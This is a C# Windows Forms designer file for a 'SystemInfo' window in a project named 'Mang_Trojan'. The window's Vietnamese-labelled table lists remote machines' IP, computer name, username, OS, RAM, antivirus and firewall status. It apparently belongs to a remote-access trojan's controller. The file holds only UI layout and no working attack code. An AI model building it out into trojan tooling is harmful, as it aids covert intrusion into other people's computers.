namespace Mang_Trojan.form
{
    partial class SystemInfo
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.listViewServers = new System.Windows.Forms.ListView();
            this.IP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ComputerName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Username = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.OS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.RAM = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Antivirus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Firewall = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.SuspendLayout();
            // 
            // listViewServers
            // 
            this.listViewServers.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.listViewServers.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.IP,
            this.ComputerName,
            this.Username,
            this.OS,
            this.RAM,
            this.Antivirus,
            this.Firewall});
            this.listViewServers.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listViewServers.GridLines = true;
            this.listViewServers.Location = new System.Drawing.Point(0, 0);
            this.listViewServers.Name = "listViewServers";
            this.listViewServers.Size = new System.Drawing.Size(772, 445);
            this.listViewServers.TabIndex = 3;
            this.listViewServers.UseCompatibleStateImageBehavior = false;
            this.listViewServers.View = System.Windows.Forms.View.Details;
            // 
            // IP
            // 
            this.IP.Text = "Địa chỉ IP";
            this.IP.Width = 134;
            // 
            // ComputerName
            // 
            this.ComputerName.Text = "Tên máy tính";
            this.ComputerName.Width = 144;
            // 
            // Username
            // 
            this.Username.Text = "Tên người sử dụng";
            this.Username.Width = 105;
            // 
            // OS
            // 
            this.OS.Text = "Hệ điều hành";
            this.OS.Width = 209;
            // 
            // RAM
            // 
            this.RAM.Text = "RAM";
            this.RAM.Width = 70;
            // 
            // Antivirus
            // 
            this.Antivirus.Text = "Diệt virus";
            this.Antivirus.Width = 163;
            // 
            // Firewall
            // 
            this.Firewall.Text = "Tường lửa";
            this.Firewall.Width = 202;
            // 
            // SystemInfo
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.GradientActiveCaption;
            this.ClientSize = new System.Drawing.Size(772, 445);
            this.Controls.Add(this.listViewServers);
            this.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
            this.Name = "SystemInfo";
            this.Text = "SystemInfo";
            this.ResumeLayout(false);

        }

        #endregion

        public System.Windows.Forms.ListView listViewServers;
        private System.Windows.Forms.ColumnHeader IP;
        private System.Windows.Forms.ColumnHeader ComputerName;
        private System.Windows.Forms.ColumnHeader Username;
        private System.Windows.Forms.ColumnHeader OS;
        private System.Windows.Forms.ColumnHeader RAM;
        private System.Windows.Forms.ColumnHeader Antivirus;
        private System.Windows.Forms.ColumnHeader Firewall;

    }
}